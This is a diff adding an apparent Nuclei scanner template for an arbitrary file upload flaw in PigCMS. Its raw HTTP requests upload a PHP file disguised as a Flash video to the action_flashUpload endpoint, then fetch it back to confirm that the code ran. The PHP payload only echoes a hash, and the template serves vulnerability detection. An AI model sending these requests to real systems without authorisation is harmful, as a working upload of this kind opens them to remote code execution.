@@ -1,0 +1,52 @@
+id: pigcms-file-arbitrary-upload
+info:
+  name: PigCMS Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    PigCMS allows arbitrary file uploads through the action_flashUpload endpoint, potentially leading to remote code execution.
+variables:
+  boundary: "{{rand_text_alphanumeric(8)}}"
+http:
+  - raw:
+      - |
+        POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="filePath"; filename="test.php"
+        Content-Type: video/x-flv
+
+        <?php echo md5('{{boundary}}'); ?>
+        --{{boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "MAIN_URL_ROOT/upload/images/"
+    extractors:
+      - type: regex
+        name: fpath
+        internal: true
+        group: 1
+        regex:
+          - "MAIN_URL_ROOT(.+)"
+  - raw:
+      - |
+        GET /cms{{fpath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5(boundary)}}"
